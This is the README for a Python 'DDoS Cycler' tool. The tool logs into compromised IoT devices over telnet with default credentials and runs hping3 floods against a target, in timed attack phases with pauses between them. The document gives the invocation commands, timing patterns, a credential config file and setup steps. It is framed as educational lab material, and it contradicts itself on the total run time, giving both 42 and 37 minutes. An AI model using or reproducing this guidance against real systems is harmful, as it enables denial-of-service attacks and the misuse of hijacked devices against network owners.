# DDoS Cycler - Advanced Timing Pattern

## Overview
The DDoS Cycler script has been updated with a sophisticated timing pattern that implements:
- **4-minute attack phases** followed by **2-minute regular pauses**
- **5-minute long pauses** after every **3 attacks**
- Configurable parameters for all timing aspects

## New Timing Pattern

### Default Pattern (6 cycles total):
1. **Attack 1** (4 min) → **Pause** (2 min)
2. **Attack 2** (4 min) → **Pause** (2 min)  
3. **Attack 3** (4 min) → **Long Pause** (5 min)
4. **Attack 4** (4 min) → **Pause** (2 min)
5. **Attack 5** (4 min) → **Pause** (2 min)
6. **Attack 6** (4 min) → **Complete**

### Total Duration: 42 minutes
- 6 attacks × 4 minutes = 24 minutes
- 4 regular pauses × 2 minutes = 8 minutes  
- 1 long pauses × 5 minutes = 5 minutes
- **Total: 37 minutes**

## Command Line Usage

### Basic Usage
```bash
python ddos_cycler.py --target 192.168.1.100 --devices devices_config.json
```

### Advanced Timing Configuration
```bash
python ddos_cycler.py \
  --target 192.168.1.100 \
  --devices devices_config.json \
  --attack-time 4 \
  --pause-time 2 \
  --long-pause 5 \
  --cycles 6 \
  --attacks-per-group 3
```

### Single Device Quick Start
```bash
python ddos_cycler.py \
  --target 192.168.1.100 \
  --add-device 192.168.1.10 admin admin123
```

## New Command Line Arguments

| Argument | Default | Description |
|----------|---------|-------------|
| `--attack-time` | 4 | Attack duration in minutes |
| `--pause-time` | 2 | Regular pause duration in minutes |
| `--long-pause` | 5 | Long pause duration in minutes after attack groups |
| `--attacks-per-group` | 3 | Number of attacks before triggering long pause |
| `--cycles` | 6 | Total number of attack cycles |

## Interactive Configuration

When run without command line arguments, the script provides an interactive setup that includes:

1. **Device Configuration**
   - Add/remove attack devices
   - Load/save device configurations
   - Validate device credentials

2. **Advanced Timing Setup**
   - Configure attack duration
   - Set regular pause duration
   - Set long pause duration
   - Define attacks per group
   - Set total cycles

3. **Real-time Calculations**
   - Total estimated duration
   - Pattern visualization
   - Start/end time predictions

## Configuration Files

### Device Configuration (devices_config.json)
```json
[
  {
    "ip": "192.168.1.10",
    "username": "admin",
    "password": "admin123"
  },
  {
    "ip": "192.168.1.11", 
    "username": "root",
    "password": "password"
  }
]
```

## Features

### Enhanced Monitoring
- Real-time countdown timers for each phase
- Phase-specific status messages
- Detailed logging for each attack device
- Estimated completion times

### Flexible Patterns
- Configurable attack groups
- Variable pause durations
- Scalable to any number of cycles
- Custom timing patterns

### Robust Error Handling
- Graceful shutdown with Ctrl+C
- Thread management and cleanup
- Device connection error recovery
- Comprehensive logging

## Example Patterns

### High-Intensity Pattern
```bash
python ddos_cycler.py \
  --attack-time 6 \
  --pause-time 1 \
  --long-pause 3 \
  --attacks-per-group 2 \
  --cycles 8
```

### Extended Testing Pattern  
```bash
python ddos_cycler.py \
  --attack-time 3 \
  --pause-time 3 \
  --long-pause 10 \
  --attacks-per-group 5 \
  --cycles 15
```

### Quick Validation Pattern
```bash
python ddos_cycler.py \
  --attack-time 1 \
  --pause-time 1 \
  --long-pause 2 \
  --attacks-per-group 2 \
  --cycles 4
```

## Safety Features

- **Explicit confirmation** required before starting attacks
- **Graceful shutdown** with signal handling
- **Thread cleanup** on interruption
- **Educational warnings** and disclaimers

## Lab Environment Setup

1. **Target System**: MQTT broker or IoT device (port 1883)
2. **Attack Devices**: Compromised IoT devices with hping3 installed
3. **Network Isolation**: Ensure attacks remain within lab environment
4. **Monitoring Tools**: Network analyzers, resource monitors

## Educational Use Only

⚠️ **WARNING**: This tool is designed exclusively for controlled laboratory environments and security research. Never use against systems you do not own or have explicit permission to test.

## Dependencies

- Python 3.7+
- telnetlib (deprecated in Python 3.13, will need replacement)
- hping3 on attack devices
- Network access to target and attack devices

## Troubleshooting

### Common Issues
1. **Telnet connection failures**: Verify device IPs and credentials
2. **Sudo password prompts**: Ensure devices can run hping3 with sudo
3. **Network timeouts**: Check network connectivity and firewall settings
4. **Process cleanup**: May require manual pkill hping3 on devices

### Debug Mode
Add verbose logging by modifying the script or redirecting output:
```bash
python ddos_cycler.py --target 192.168.1.100 --devices devices_config.json > attack_log.txt 2>&1
```
